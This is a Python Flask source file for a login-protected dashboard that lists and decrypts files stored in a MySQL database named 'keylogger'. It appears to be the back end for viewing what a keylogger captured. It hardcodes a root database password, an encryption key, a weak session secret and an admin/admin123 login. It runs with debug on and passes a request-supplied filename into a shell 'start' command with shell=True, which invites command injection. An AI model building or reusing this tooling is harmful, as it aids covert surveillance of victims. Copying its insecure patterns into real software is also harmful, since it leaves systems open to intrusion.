from flask import Flask, render_template, request, redirect, session
from flask import send_file
import os
from flask_mysqldb import MySQL
from cryptography.fernet import Fernet

app = Flask(__name__)

# MySQL configurations
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Rutik@5555'
app.config['MYSQL_DB'] = 'keylogger'

# Other configurations
app.secret_key = '12345'

mysql = MySQL(app)

# Fernet key for encryption/decryption
key = b"LDtGBp9DMpHh7CROYmkhaEx5Dt9VhW-dVijLS4oBmrw="  # Replace with your Fernet key
cipher_suite = Fernet(key)

import subprocess
import os
from mimetypes import MimeTypes
from cryptography.fernet import Fernet

# Assuming cipher_suite is initialized elsewhere in your code
# key = b"your_encryption_key_here"
# cipher_suite = Fernet(key)

def decrypt_file_data(encrypted_data, filename):
    try:
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        
        # Determine the MIME type of the decrypted data
        mime = MimeTypes()
        content_type, _ = mime.guess_type(filename)
        
        # Prepend the prefix to the filename
        new_filename = 'D_' + filename  # Prefix 'D_' for decrypted files
        
        # Save the decrypted data to a new file
        with open(new_filename, 'wb') as f:
            f.write(decrypted_data)
        
        # Rename the file with the correct file extension if it's a PNG file
        if filename.endswith('.png'):
            os.rename(new_filename, new_filename + '.png')
            new_filename += '.png'
            # Open .png files directly with the default app
            subprocess.Popen(['start', '', new_filename], shell=True)
        else:
            # Open other files with the default program based on its MIME type
            if content_type:
                subprocess.Popen(['start', '', new_filename], shell=True)  # Open with default program
            else:
                # If MIME type is not recognized, open with default program
                subprocess.Popen(['start', '', new_filename], shell=True)

        return "File decrypted successfully", content_type
    except Exception as e:
        print("Error decrypting file data:", e)
        return None, None

# Example usage
# encrypted_data = ... # Your encrypted data here
# filename = 'example.png' # The filename you are decrypting
# decrypt_file_data(encrypted_data, filename)



@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login_post():
    # Define hardcoded username and password
    hardcoded_username = "admin"
    hardcoded_password = "admin123"
    
    # Get username and password from the form
    username = request.form['username']
    password = request.form['password']
    
    # Check if the entered username and password match the hardcoded values
    if username == hardcoded_username and password == hardcoded_password:
        # Set session variables
        session['loggedin'] = True
        session['username'] = username
        return redirect('/dashboard')
    else:
        # If the entered credentials are incorrect, render the login page with an error message
        error = 'Invalid username or password.'
        return render_template('login.html', error=error)


@app.route('/dashboard')
def dashboard():
    if 'loggedin' in session:
        try:
            cur = mysql.connection.cursor()
            cur.execute("SELECT filename, DATE_FORMAT(upload_date, '%d/%m/%Y'), upload_time FROM files")
            files = cur.fetchall()
            cur.close()
            return render_template('dashboard.html', files=files)
        except Exception as e:
            print("Error fetching files:", e)
            return render_template('dashboard.html', files=None, error="Error fetching files: " + str(e))
    else:
        return redirect('/')


@app.route('/decrypt_file')
def decrypt_file():
    if 'loggedin' in session:
        filename = request.args.get('filename')
        if not filename:
            return "Filename parameter is missing or empty"

        try:
            cur = mysql.connection.cursor()
            cur.execute("SELECT file_data FROM files WHERE filename = %s", (filename,))
            encrypted_data = cur.fetchone()
            cur.close()
            if encrypted_data:
                decrypted_data, content_type = decrypt_file_data(encrypted_data[0], filename)
                if decrypted_data is not None:
                    return decrypted_data, 200, {'Content-Type': content_type}
                else:
                    return "Error decrypting file", 500
            else:
                return "File not found", 404
        except Exception as e:
            print("Error fetching file data:", e)
            return "Error fetching file data: " + str(e), 500
    else:
        return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
